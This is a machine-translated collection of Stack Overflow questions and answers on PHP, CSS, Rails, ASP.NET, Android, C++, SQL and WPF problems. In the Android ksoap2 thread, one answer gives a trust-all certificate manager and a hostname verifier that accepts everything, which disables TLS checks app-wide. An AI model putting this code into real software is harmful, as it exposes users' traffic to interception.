        $this->due_date=date('Y-m-d', strtotime(str_replace(",", "", $this->due_date)));
        $this->invoice_issue_date=date('Y-m-d', strtotime(str_replace(",", "", $this->invoice_issue_date)));
        return TRUE;
    }
    else return false;
  } 
```

并在查看文件 {{ _form }}。我是这样弄的

```
<div class="row">
    <?php echo $form->labelEx($model,'invoice_issue_date'); ?>
    <?php 
    $this->widget('zii.widgets.jui.CJuiDatePicker',
      array(
        'attribute'=>'invoice_issue_date',
        'model'=>$model,
        'options' => array(
                      'mode'=>'focus',
                      'dateFormat'=>'d MM, yy',
                      'showAnim' => 'slideDown',
                      ),
        'htmlOptions'=>array('size'=>30,'class'=>'date', 'value'=>date("d F, Y")),
        )
      );      
     ?>
   <?php echo $form->error($model,'invoice_issue_date'); ?>
    </div>

<div class="row">
<?php echo $form->labelEx($model,'due_date'); ?>
<?php 
$this->widget('zii.widgets.jui.CJuiDatePicker',
array(
      'attribute'=>'due_date',
      'model'=>$model,
      'options' => array(
                        'mode'=>'focus',
                        'dateFormat'=>'d MM, yy',
                        'showAnim' => 'slideDown',
                        ),
'htmlOptions'=>array('size'=>30,'class'=>'date'),
    )
);
?>
<?php echo $form->error($model,'due_date'); ?>
</div> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T18:51:22.273

in`afterFind`并且`beforeSave`您正在重新格式化 due_date 值，但不是该`invoice_issue_date`值。在`beforeSave`您必须确保所有值都采用数据库可以处理的有效时间戳格式。因此，如果不是`YYYY-MM-DD`数据库，则可能会保存`0000-00-00`。

# css - Firefox 与对齐的兼容性问题

> ID：11155278
> 
> 赞同：0
> 
> 时间：2012-06-22T11:25:20.893
> 
> 标签：css, firefox, html, alignment

如何将导航文本重新对齐到栏

这就是它的样子（在 safari 和 google chrome 中也是如此）

![在此处输入图像描述](../Images/c97ac83b57c5aac05f6e3567b029e6fb.png)

这就是它在 Firefox 中的样子

![在此处输入图像描述](../Images/20e1368e17e8afffd40c46c72c0ed37c.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:27:52.013

嘿，现在在你的 CSS`#nav ul` **边距中定义**

像这样

```
 #nav ul {
        margin: 0;
margin-left:5px;
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:32:16.167

将您的`#nav ul`样式设置为`margin: 0;`在 margin-left 之前包含。

浏览器的默认用户代理样式表将添加边距和填充，因此请确保您使用 CSS 重置（如[Eric Meyer 的](http://meyerweb.com/eric/tools/css/reset/)）以避免将来出现这些问题。

# codeigniter - Codeigniter 表单验证不会运行

> ID：11155290
> 
> 赞同：0
> 
> 时间：2012-06-22T11:26:22.543
> 
> 标签：codeigniter, validation, activation

似乎有很多关于表单验证的问题，但没有一个回答我的问题。

除非我遗漏了一些明显的东西，否则我的表单验证将不会运行，但仅在某个页面上，所有其他页面都很好。

这是问题代码：

```
public function activate($code = '')
    {
        // This function lets a user activate their account with the code or link they recieved in an email
        if($code == '' || isset($_POST[''])){
            $form = '';
            $this->load->library('form_validation');
            $this->load->helper('form');

            if ($this->form_validation->run() == FALSE){
                // No code, so display a box for them to enter it manually
                $this->form_validation->set_rules('activation_code', 'Activation Code', 'trim|required|xss_clean|integer');

                $form .= validation_errors();
                $form .= form_open_multipart('user/activate', array('class' => 'formee'));

                $form .= form_label('Enter your activation code below and click \'Activate\' to start using your account. If you need a hand please contact live chat.', 'activation_code');
                $form .= form_input(array('name' => 'activation_code'));

                $data = array(
                    'name'        => 'submit',
                    'value'       => 'Activate',
                    'class'       => 'right',
                    'style'       => 'margin-top:10px;',
                );

                $form .= form_submit($data);
                $form .= form_close();
            }else{
                $form .= "form run";
            }
        }else{
            // Code recieved through the GET or POST variable XSS clean it and activate the account
        }

        $data = array(
            'title' => $this->lang->line('activate_title'),
            'links' => $this->gen_login->generate_links(),
            'content' => $form
        );
        $this->parser->parse('beer_template', $data);
    } 
```

您可以在此处查看页面：`http://77.96.119.180/beer/user/activate`

您可以在此处查看表单验证：`http://77.96.119.180/beer/user/register`

任何人都可以帮忙吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T12:06:50.343

运行后调用 set_rules ：

```
if ($this->form_validation->run() == FALSE){
  // No code, so display a box for them to enter it manually
  $this->form_validation->set_rules('activation_code', 'Activation Code', 'trim|required|xss_clean|integer'); 
```

但应该是之前：

```
$this->form_validation->set_rules('activation_code', 'Activation Code', 'trim|required|xss_clean|integer');
if ($this->form_validation->run() == FALSE){
} 
```

# ruby-on-rails - RESTful 路由被命名路由覆盖

> ID：11155301
> 
> 赞同：0
> 
> 时间：2012-06-22T11:27:29.250
> 
> 标签：ruby-on-rails

在 Rails 中的 routes.rb 中定义资源时，我遇到以下问题：我的资源支持标准的 CRUD 操作，并且有一个自定义函数/路由，它允许过滤。现在这个自定义路由匹配编辑路由并在实际 RESTful 路由之前跳转。

有没有办法优先考虑 RESTful 路由，以便它们首先匹配？

```
resources :items do
  get ':category(/:level)', :action => :filter, :on => :collection, :as => 'filter'
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:31:12.563

您应该只设置一个简单的 get 路由（如果它是一个 GET 请求）

```
get 'filter', :to => "items#filter" 
```

如果您有任何问题，总会有 RoR 指南 :)

[http://guides.rubyonrails.org/routing.html](http://guides.rubyonrails.org/routing.html)

# c# - System.Web.Hosting.HostingEnvironment.Cache 是否等于 HttpContext.Current.Cache？

> ID：11155303
> 
> 赞同：2
> 
> 时间：2012-06-22T11:27:37.217
> 
> 标签：c#, asp.net, caching

我发现[这篇文章](http://www.codeproject.com/Articles/12117/Simulate-a-Windows-Service-using-ASP-NET-to-run-sc)解释了如何在不使用任何调度程序或 Windows 服务的情况下使用缓存项过期来为 ASP.NET 应用程序制定计划作业。这对我来说真的很有趣！

在文章中，作者正在使用`HttpContext.Current.Cache`添加一个项目。因此，当缓存中的项目过期时，可以进行处理..

但是在他的文章中，他从服务器向自己发出了一个“错误”请求，以访问`HttpContext`缓存并在前一个过期时再次添加项目。我尝试在`System.Web.Hosting.HostingEnvironment`没有任何 HttpContext 的情况下使用 Cache 访问（因此无需创建“DummyRequest”），它似乎有效。

关于这个缓存有什么我不理解或不知道的吗？***和******缓存不同吗******？`HttpContext``HostingEnvironment`***我认为这是一回事，智能感知将两者描述为“应用程序缓存”，没有区别。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:33:03.977

它们是相同的，并且都调用`HttpRuntime.Cache`- 从源代码：

```
public static Cache System.Web.Hosting.HostingEnvironment.Cache
{
    get
    {
        return HttpRuntime.Cache;
    }
} 
```

和

```
public Cache System.Web.HttpContext.Cache
{
    get
    {
        return HttpRuntime.Cache;
    }
} 
```

这也是 MSDN 上的状态：

**HostingEnvironment.Cache**
获取当前应用程序的 Cache 实例。
命名空间：System.Web.Hosting
程序集：System.Web（在 system.web.dll 中）
参考：http: [//msdn.microsoft.com/en-us/library/system.web.hosting.hostingenvironment.cache(VS. 85).aspx](http://msdn.microsoft.com/en-us/library/system.web.hosting.hostingenvironment.cache(VS.85).aspx)

**HttpContext.Cache 属性**

获取当前应用程序域的 Cache 对象。
命名空间：System.Web
程序集：System.Web（在 System.Web.dll 中）
参考：http: [//msdn.microsoft.com/en-us/library/system.web.httpcontext.cache.aspx](http://msdn.microsoft.com/en-us/library/system.web.httpcontext.cache.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:33:13.183

两者都指向同一个缓存实例。在某些情况下，您无法获得`HttpContext.Current`. 然后，您始终可以通过缓存`System.Web.Hosting.HostingEnvironment.Cache`作为后备。

# android - 在我的 7 英寸平板电脑的纵向视图中，相机捕捉图像未显示在 Imageview 中

> ID：11155312
> 
> 赞同：0
> 
> 时间：2012-06-22T11:28:12.453
> 
> 标签：android, android-camera

我想在我的 7 英寸平板电脑 3.2 的图像视图中显示通过相机捕获的图像。当我正在捕获图像并且控制返回到我的活动图像时，图像不显示在`Image View`. 但同样的事情在智能手机上也能正常工作。

我也尝试`android:configChanges="keyboardHidden|orientation"`在清单中进行该活动，但仍然存在问题。

如果我通过将平板电脑保持在横向来捕获图像，它可以正常工作并显示图像。

我将相机意图称为如下

我在**3.2**版的 7 英寸**三星平板电脑 GT-P6200**上运行我的应用程序。

 **我调用的相机意图如下

```
Intent cameraIntent = new Intent();
cameraIntent.setAction(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
startActivityForResult(cameraIntent, PICTURE_FROM_CAMERA); 
```

请帮我解决这个问题

我的活动结果方法

```
public void onActivityResult(int requestCode, int resultCode, Intent data) {
    if (resultCode == RESULT_OK) {
        if (requestCode == PICTURE_FROM_CAMERA) {
            Bitmap bitmap = (Bitmap) data.getExtras().get("data");
            photoView.setImageBitmap(bitmap);
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T09:25:07.903

尝试将设备旋转到横向，因为 MediaStore 捕获仅适用于横向模式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T06:22:06.927

这是 Some 选项卡中的常见问题，对于此问题，您可以尝试以下代码。这个对我有用。

```
 try {
        File f = new File(SD_CARD_IMAGE_PATH);
        ExifInterface exif = new ExifInterface(f.getPath());
        int orientation = exif.getAttributeInt(ExifInterface.TAG_ORIENTATION, ExifInterface.ORIENTATION_NORMAL);

        int angle = 0;

        if (orientation == ExifInterface.ORIENTATION_ROTATE_90) {
            angle = 90;
        } 
        else if (orientation == ExifInterface.ORIENTATION_ROTATE_180) {
            angle = 180;
        } 
        else if (orientation == ExifInterface.ORIENTATION_ROTATE_270) {
            angle = 270;
        }

        Matrix mat = new Matrix();
        mat.postRotate(angle);

        Bitmap bmp = BitmapFactory.decodeStream(new FileInputStream(f), null, null);
        Bitmap correctBmp = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), mat, true);                 
    }
    catch (IOException e) {
        Log.w("TAG", "-- Error in setting image");
    }   
    catch(OutOfMemoryError oom) {
        Log.w("TAG", "-- OOM Error in setting image");
    } 
```

但是我应该以其他形式使用吗？**

# php - 用于通过 php 提供 css 的 php 标头

> ID：11155313
> 
> 赞同：1
> 
> 时间：2012-06-22T11:28:16.247
> 
> 标签：php, css, caching

事情就是这样。我正在提供一些压缩的 CSS 内容

```
(`str_replace(array("\r", "\n", "\t", '\s\s+'), '', cssGoesHere)`) 
```

通过我页面中的 PHP 文件：

`<link rel="stylesheet" type="text/css" href="/css/loader.css.php" />`

问题是：如何让浏览器缓存返回的 css，但如果内容发生更改则更新缓存？

PHP文件没有被修改，所以附加类似的东西

```
<?php echo filemtime('/css/loader.css.php'); ?> 
```

`href`属性不是一个选项。这可以通过标题解决吗？如果可以，如何解决？因为 AFAIK 如果我像上面写的那样提供它，浏览器只会缓存结果并继续重用缓存（当然，前提是浏览器已启用/能够这样做），但我需要它知道内容何时改变了。

编辑：我用我的代码制作了一个 github 项目（尽管自从我写了这篇文章以来，我确实对它进行了很多更改以获得更大的灵活性）。这是链接：[https](https://github.com/jurchiks/YACC)
://github.com/jurchiks/YACC 如果您有任何建议，请将它们写到我的电子邮件或smth。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T13:21:56.310

您可以将版本号添加到 CSS 链接 href 并使用 mod rewrite 将其路由回原始 CSS 文件。

例如。假设您从版本 1 开始（请注意文件名的版本附录）：

```
<link rel="stylesheet" type="text/css" href="/css/loader-v001.css.php" /> 
```

浏览器会缓存这个文件。下次更新 CSS 文件并且不希望浏览器使用缓存文件时，只需像这样更改版本号：

```
<link rel="stylesheet" type="text/css" href="/css/loader-v002.css.php" /> 
```

然后，在您的 mod 重写中，将对文件的任何请求路由`loader-v{x}.css.php`到`loader.css.php`.

我不确定这是否足以满足您的需求，因为它确实需要手动更改版本号。但是，不同的文件名将确保浏览器将其视为实际的“新”文件并重新下载。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-22T11:36:05.277

它可以通过标头缓存控制来解决，但事实证明这不是很有效。因为某些浏览器会覆盖或修改您的强制设置。

我看不到您从哪里获取 CSS 数据，如果它是 CSS 文件，您可以获取 css 文件的 filemtime 作为版本指示符，或者只是在某处提供每次 CSS 文件更改时必须更改的版本字符串。

顺便说一句，`str_replace(array("\r", "\n", "\t", '\s\s+')`, 并不能有效地删除所有换行符。你应该使用类似的东西

```
$foo = nl2br($string, FALSE);
$bar = str_replace(array('<br>', '\s\s+'), '', cssGoesHere) 
```

反而。

HTH :)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-22T11:38:16.007

在更改时可靠地加载文件的唯一方法是您声明的方法。否则，页面将缓存文件并在它认为必要的时候保留它。如果不请求和下载至少标题，它就无法检查页面是否已更改，如果它已经消失那么远，它可能只下载页面的其余部分，因为带宽将是最小的。

如果您真的无法将修改日期附加到 HTML，最好的选择是通过 PHP 设置缓存标头。

```
header("Cache-Control: max-age=time-in-seconds"); 
```

但是，这并不总是有效，因为服务器设置和浏览器设置可以覆盖它，尤其是在激进的缓存浏览器（如 Internet Explorer）中。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-22T11:39:58.457

在您的 css php 页面中使用它：

```
header('Content-type: text/css');
header("Cache-Control: no-cache, must-revalidate"); 
```

您可以[在 PHP 的官方文档中查看有关标头的更多信息](http://php.net/manual/en/function.header.php)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-22T11:39:28.423

我建议保留生成缓存内容的时间，例如 style.php 保存 CSS 数据的最后一次修改时间是 2012 年 6 月 21 日，缓存内容最后一次生成时间是 2012 年 6 月 20 日运行日期比较在 strtotime() 整数中，您会看到缓存的内容必须从新内容再次生成。

# java - 如何在调试模式下启动 james 服务？

> ID：11155317
> 
> 赞同：1
> 
> 时间：2012-06-22T11:28:38.830
> 
> 标签：java, james

我正在将 james 作为窗口服务运行。我已将我的 mailet 放在 config.file 中，该文件进一步调用了我的应用程序特定库。现在我想在收到邮件后调试我的应用程序中的一些类。我不知道如何在调试模式下启动 james 窗口服务，以便我可以从我的 eclipse 连接到同一个端口并开始调试。

另一件事是当我将它作为窗口服务启动时，james 服务器工作正常，但是一旦使用 James.bat 文件启动它，它就会给出一些与我的应用程序相关的错误。所以看起来 James.bat 中的詹姆斯已经出局了。请提供您的意见，我如何在调试模式下启动 james 服务。詹姆斯版本是 2.3.2

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-12T10:09:47.967

James 不支持在调试模式下启动，所以你必须自己在调试模式下启动它。对于 James 3 (beta)，这很容易，我假设您也可以将此解决方案用于 2.3.2 版本。

1.  首先在目录中创建`rundebug.bat`文件，内容如下：`JAMES\bin`

    > 设置 JAVA_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=8000
    > 
    > 运行.bat

2.  从命令行运行它。James 服务器现在已准备好进行远程调试。

3.  在 Eclipse 中，使用默认配置在 Debug Configurations 对话框中创建一个新的“Remote Java Application”。在“项目”字段中选择包含您要调试的邮件的项目。

4.  放置断点并运行配置。

祝你好运！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-19T10:39:12.403

您应该取消注释 JAMES_HOME/bin/run.bat 中的以下行以启用远程调试
：

```
rem set DEBUG=-Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y 
```

到

```
set DEBUG=-Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y,suspend=y 
```

# android - 带有可信证书的 KSaop2 HttpsTransportSE 的 SSLHandshakeException

> ID：11155321
> 
> 赞同：1
> 
> 时间：2012-06-22T11:28:45.587
> 
> 标签：android, tomcat, ssl, ksoap2

我的 ksoap2 webservice 和 webService-client 与 HttpTransportSE 配合得很好。现在我想将 SSL 与受信任的证书一起使用。为了在 Tomcat SSL 上使用 web 服务，我在 Axis2.xml 中添加了 Https Transport Reciver，我认为 web 服务可以工作。这是我的 SSL 网络服务：

```
<https://myURL.de:8443/WebProject_KomplexeObjekte_SSL/services/HelloWorldWS?wsdl>? 
```

下一步是在我的客户端中将 httptransportSE(URL) 更改为 httpstransportSE(HOST, PORT, FILE, TIMEOUT)。这是我的客户：

```
import org.ksoap2.SoapEnvelope;
import org.ksoap2.serialization.SoapObject;
import org.ksoap2.serialization.SoapSerializationEnvelope;
import org.ksoap2.transport.HttpTransportSE;
import org.ksoap2.transport.HttpsServiceConnectionSE;
import org.ksoap2.transport.HttpsTransportSE;

import android.app.Activity;
import android.os.Bundle;
import android.widget.TextView;

public class WSClientKomplexeObjekteActivity extends Activity {

private static final String SOAP_ACTION = "http://ws.chathura.com/getCategoryObject";
private static final String METHOD_NAME = "getCategoryObject";
private static final String NAMESPACE = "http://ws.chathura.com";
private static final String NAMESPACE2 = "http://ws.chathura.com/xsd";
private static final String HOST = "myURL.de";
private static final int PORT = 8443;
private static final String FILE = "/WebProject_KomplexeObjekte_SSL/services/HelloWorldWS?wsdl";
private static final int TIMEOUT = 1000;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    TextView tv = (TextView)findViewById(R.id.textview1);

    SoapObject Request = new SoapObject(NAMESPACE, METHOD_NAME);
    Category C = new Category();
    C.setCategoryId(1);
    C.setDescription("Client Beschreibung");
    C.setName("Client Name"); 

    Request.addProperty("obj", C);

    SoapSerializationEnvelope envelope = new SoapSerializationEnvelope(SoapEnvelope.VER11);
    envelope.setOutputSoapObject(Request);
    envelope.addMapping(NAMESPACE2, C.getClass().getSimpleName(), C.getClass());

    HttpsTransportSE androidHttpsTransport = new HttpsTransportSE(HOST, PORT, FILE, TIMEOUT);

    Category ans = null;
    try {
        androidHttpsTransport.call(SOAP_ACTION, envelope);
        ans = (Category)envelope.getResponse();
        tv.setText("CategoryId: " + ans.getCategoryId() + "\nName: " + ans.getName() + "\nDescription: " + ans.getDescription()); 
    }
    catch(Exception e) {
        e.printStackTrace();
    }
}

} 
```

现在我在 Logcat 中得到了这个异常：

```
W/System.err(619): javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found. 
```

由于这个例外，我试图包含一个密钥库，其中包含我的 tomcat 上用于 ssl 的证书。您可以在评论中看到此代码。那是没有成功的。我得到以下异常：

```
E/AndroidRuntime(654): java.lang.RuntimeException: Unable to start activity ComponentInfo{de.bachelor.marcel/de.bachelor.marcel.WSClientKomplexeObjekteActivity}: java.lang.NullPointerException 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-26T16:03:15.420

好的...我自己解决了这个问题。客户端代码不是问题。它工作得很好。唯一的问题是在服务器端。Android 不信任我的服务器，因为我忘记包含根证书。因此，如果您有同样的问题，您可以使用[http://www.sslshopper.com/ssl-checker.html#检查您的 ssl 服务器](http://www.sslshopper.com/ssl-checker.html#)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-26T10:15:44.383

您可以使用此类绕过证书：

```
public class FakeX509TrustManager implements X509TrustManager {

    private static TrustManager[] trustManagers;
    private static final X509Certificate[] _AcceptedIssuers = new
            X509Certificate[] {};

    @Override
    public void checkClientTrusted(X509Certificate[] chain, String
            authType) throws CertificateException {
    }

    @Override
    public void checkServerTrusted(X509Certificate[] chain, String
            authType) throws CertificateException {
    }

    public boolean isClientTrusted(X509Certificate[] chain) {
        return true;
    }

    public boolean isServerTrusted(X509Certificate[] chain) {
        return true;
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return _AcceptedIssuers;
    }

    public static void allowAllSSL() {
        HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier()
        {
            @Override
            public boolean verify(String hostname, SSLSession session) {
                return true;
            }

        });

        SSLContext context = null;
        if (trustManagers == null) {
            trustManagers = new TrustManager[] { new FakeX509TrustManager() };
        }

        try {
            context = SSLContext.getInstance("TLS");
            context.init(null, trustManagers, new SecureRandom());
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (KeyManagementException e) {
            e.printStackTrace();
        }

        HttpsURLConnection.setDefaultSSLSocketFactory(context.getSocketFactory());
    }

} 
```

# c++ - boost::iterator_range 的 rbegin()

> ID：11155322
> 
> 赞同：0
> 
> 时间：2012-06-22T11:28:48.073
> 
> 标签：c++, boost, iterator, reverse, traversal

我重构了一个使用单个元素列表的类，因此它现在使用此类列表的列表。为了最大限度地减少派生类中的变化，我实现了一个自定义`iterator`using`boost::iterator_facade`和一个方法来获取一个`boost::iterator_range<iterator>`可用于迭代而不是原始列表的方法。

这似乎工作，除了在一个地方`rbegin()`使用。`boost::iterator_range`似乎不支持这样的事情。

*获取范围的最后一个元素的简单方法是什么？*

我正在使用 VS2008 SP1，即 std::tr1 中只有一些 C++11 支持，并且显然也可以使用 boost。

```
typedef std::deque<MyData> DataList;

class MyClass : private boost::noncopyable
{
public:
    void AppendData(DataList* newData    

private:
    typedef std::deque<DataList*> ListOfDatatLists;

    /**
     * Custom iterator.
     * The content is not meant to be modified so this iterator operates on const lists only.
     */
    class iterator
        : public boost::iterator_facade <
        iterator,
        MyData,
        boost::forward_traversal_tag // Only forward iteration necessary
        >
    {
    public:
        static boost::iterator_range<iterator> range(const ListOfDataLists * pListOfLists);

    private:
        friend class boost::iterator_core_access;

        iterator(const ListOfDataLists * pListOfLists = NULL) : m_pListOfLists(pListOfLists) {}

        /// \name Implementations for boost base class
        //{@
        bool equal(iterator const & other) const;
        MyData & dereference() const;
        void increment();
        difference_type distance_to(const iterator & other) const;
        //@}

        const ListOfDataLists * m_pListOfLists;
        ListOfDataLists::const_iterator m_listIt; ///< The current list of data items
        DataList::const_iterator m_dataIt; ///< An iterator of the current list
    };

    ListOfResultLists m_dataLists;

protected:
    typedef std::tr1::shared_ptr<CLockedResults> SpLockedResults;

    /// For use by derived classes instead of the former single list
    boost::iterator_range<iterator> GetData() const;
}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T11:59:05.270

1.  如果可能，一种解决方案是允许双向或随机访问遍历。这将允许您接听电话`range.end() --`（假设范围不为空）。这也将允许您使用`reversed`升压范围适配器反转范围。

2.  另一种解决方案是从范围中获取迭代器，`begin()/end()`并使用`std::distance`以确定两个迭代器之间的距离。然后，您可以使用`std::advance`比移动到最后一个元素的距离小一的开始迭代器。

# sql - INSERT INTO table which requires a Join

> ID：11155323
> 
> 赞同：0
> 
> 时间：2012-06-22T11:29:01.703
> 
> 标签：sql, sql-server, join, insert-into

Im currently trying to move data from one table to another. In a [previous question I asked today](https://stackoverflow.com/q/11155323/95) I was advised to use an insert statement. While trying to run the statement i get an error from SQL Server as follows:

> Cannot insert the value NULL into column 'Parent', table '*****.dbo.Product'; column does not allow nulls. INSERT fails.

This is the statement I have created,

```
BEGIN TRANSACTION
INSERT INTO [*****].[dbo].[Product] 
([PDate]
  ,[SDate]
  ,[CreatedBy]
  ,[CreatedDate]
  ,[UpdatedBy]
  ,[UpdatedDate])
SELECT d.[PDate]
  ,d.[SDate]
  ,d.[CreatedBy]
  ,d.[CreatedDate]
  ,d.[UpdatedBy]
  ,d.[UpdatedDate]
FROM [*****].[dbo].[ProductData] AS d
JOIN [*****].[dbo].[Product] AS t
ON d.ProductDataID = t.ProductDataID
ROLLBACK TRANSACTION 
```

I need to ensure that the data matches up correctly

Edit: Sorry, there was an error when i was copying the script. UseDRM is in both sections of my original script. What I want to do is to copy the data in the ProductData table to the Product table.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:31:23.130

The `Parent` column is not nullable and has not default value, so you need to add it to your query.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T11:43:31.980

Try using ISNULL in you select query to check if the value is null & replace it with default value.

Eg.:

```
 BEGIN TRANSACTION
    INSERT INTO [*****].[dbo].[Product] 
    ([PDate]
      ,[SDate]
      ,[UseDRM]
      ,[CreatedBy]
      ,[CreatedDate]
      ,[UpdatedBy]
      ,[UpdatedDate])
    SELECT Isnull(d.[PDate], '1/1/1900')
      ,Isnull(d.[SDate], '1/1/1900')
      ,Isnull(d.[UseDRM], "")
      ,Isnull(d.[CreatedBy], "")
      ,Isnull(d.[CreatedDate], '1/1/1900')
      ,Isnull(d.[UpdatedBy], "")
      ,Isnull(d.[UpdatedDate], '1/1/1900')
    FROM [*****].[dbo].[ProductData] AS d
    JOIN [*****].[dbo].[Product] AS t
    ON d.ProductDataID = t.ProductDataID
    ROLLBACK TRANSACTION 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-22T12:01:39.700

```
BEGIN TRANSACTION
INSERT INTO [*****].[dbo].[Product] 
([PDate]
  ,[SDate]//Check Columns no here it is  6 total
  ,[CreatedBy]
  ,[CreatedDate]
  ,[UpdatedBy]
  ,[UpdatedDate])
SELECT d.[PDate] //Check columns numbers here it is 7 here 
  ,d.[SDate]
  ,d.[UseDRM]
  ,d.[CreatedBy] 
  ,d.[CreatedDate]
  ,d.[UpdatedBy]
  ,d.[UpdatedDate]
FROM [*****].[dbo].[ProductData] AS d
JOIN [*****].[dbo].[Product] AS t
ON d.ProductDataID = t.ProductDataID
ROLLBACK TRANSACTION 
```

correct it then it will be ok `d.[UseDRM]` is not in insert

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T13:35:02.520

I finally figured out what i was doing wrong, instead of using an INSERT INTO statement I should have been using an UPDATE statement

```
UPDATE [********].[dbo].[Product] 
SET [PDate] = [********].[dbo].[ProductData].[PDate]
  ,[SDate] = [********].[dbo].[ProductData].[SDate]
  ,[CreatedBy] = [********].[dbo].[ProductData].[CreatedBy]
  ,[CreatedDate] = [********].[dbo].[ProductData].[CreatedDate]
  ,[UpdatedBy] = [********].[dbo].[ProductData].[UpdatedBy]
  ,[UpdatedDate] = [********].[dbo].[ProductData].[UpdatedDate]
FROM [********].[dbo].[ProductData], [********].[dbo].[Product]
WHERE [********].[dbo].[Product].[ProductDataID] = [********].[dbo].[ProductData].[ProductDataID] 
```

I apologise for my orginial question which is poorly written

# wpf - Window.Resources 中的 WPF ColorAnimation

> ID：11155325
> 
> 赞同：2
> 
> 时间：2012-06-22T11:29:16.927
> 
> 标签：wpf, xaml, animation, effects, coloranimation

我有一个 TextBlock，我想给它一个彩色动画效果；我做了这样的事情：

```
<Window.Resources>
    <Storyboard x:Key="AnimateTarget" RepeatBehavior="Forever">

        <ColorAnimation AutoReverse="False" Duration="0:0:5" From="Red" To="black" Storyboard.TargetName="txtBarcode" AccelerationRatio="1" Storyboard.TargetProperty="(TextBlock.Background).(SolidColorBrush.Color)" FillBehavior="HoldEnd">

        </ColorAnimation>
    </Storyboard>
</Window.Resources> 
```

我从后面的代码开始动画：

```
((Storyboard)this.Resources["AnimateTarget"]).Begin(); 
```

但是当我开始动画时，它给了我以下错误：

“背景”属性未指向路径“(0).(1)”中的 DependencyObject。

如果有人帮助我，我会最贵，

谢谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-22T12:21:28.037

给你`TextBlock`任何`Background`，它会工作。

```
<TextBlock Name="txtBarcode"
           Background="Transparent" 
```

可能`Background`是`Null`，所以没有`DependencyObject`动画。

# c++ - 在 GNU c++ 编译器中运行具有多个源文件的程序

> ID：11155327
> 
> 赞同：0
> 
> 时间：2012-06-22T11:29:21.930
> 
> 标签：c++, c, compilation, gnu

我在 Windows 7 操作系统上使用 DEV GNU c++ 编译器。我需要知道如何编译具有多个源文件的程序。这是示例，

```
#FILE1
void f1()
{
   printf("this is another file under same program");
}

#FILE2

int main()
{
   f1();
   return 0;
} 
```

实际上我需要这个来测试静态的外部类说明符如何与多个文件一起使用。所以现在只有我必须学习如何在 C 中的单个程序中处理多个文件。

谢谢提前

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-22T11:34:51.530

“多个文件”的技术术语是***[翻译单元](https://stackoverflow.com/questions/4335024/grammar-of-a-c-translation-unit#4337554)***：

```
g++ file1.cpp file2.cpp -o program 
```

或者你分开编译和链接

```
g++ -c file1.cpp -o file1.o
g++ -c file2.cpp -o file2.o

# linking
g++ file1.o file2.o -o program 
```

但这通常是没有意义的，除非你有一个更大的项目（例如 with `make`）并且想要减少构建时间。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-22T11:37:14.290

要这样预处理和编译：

```
gcc -c FILE1.c
gcc -c FILE2.c 
```

然后，链接：

```
gcc -o EXECUTABLE FILE1.obj FILE2.obj 
```

或者，您可以一步完成这两项工作：

```
gcc -o EXECUTABLE FILE1.c FILE2.c 
```

如果它是 C++ 程序，则替换`gcc`by`g++`和`.c`by `.cpp`。

它对您不感兴趣，但为了以后发现您的问题的类似读者的利益，`FILE1.cpp`可能会被命名`FILE1.cc`或类似，并且`FILE1.obj`可能会被命名`FILE1.o`，具体取决于读者的平台。

您可能会感兴趣，根据您使用的 shell，您可能必须编写诸如`-o`as之类的选项`/o`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-22T11:31:21.463

最简单的方法是在命令行中精确两个文件`gcc`：

```
gcc file1.c file2.c 
```

# php - 我如何使用 php 和 htaccess 跟踪热链接器的 IP 地址

> ID：11155328
> 
> 赞同：3
> 
> 时间：2012-06-22T11:29:21.737
> 
> 标签：php, .htaccess

我正在尝试使用 php 和 htaccess 跟踪热链接器的 IP 地址。

.htaccess 文件：

```
RewriteEngine on 
RewriteRule images/(.+)\.(jpg|gif|png) images.php 
```

图像.php

```
?php 
    $ipAddress = $_SERVER['REMOTE_ADDR'];

    $statement=$db->prepare("INSERT INTO `ipaddress` (`ip` )
            VALUES (?)");
    $statement->execute(array($ipAddress));     

?> 
```

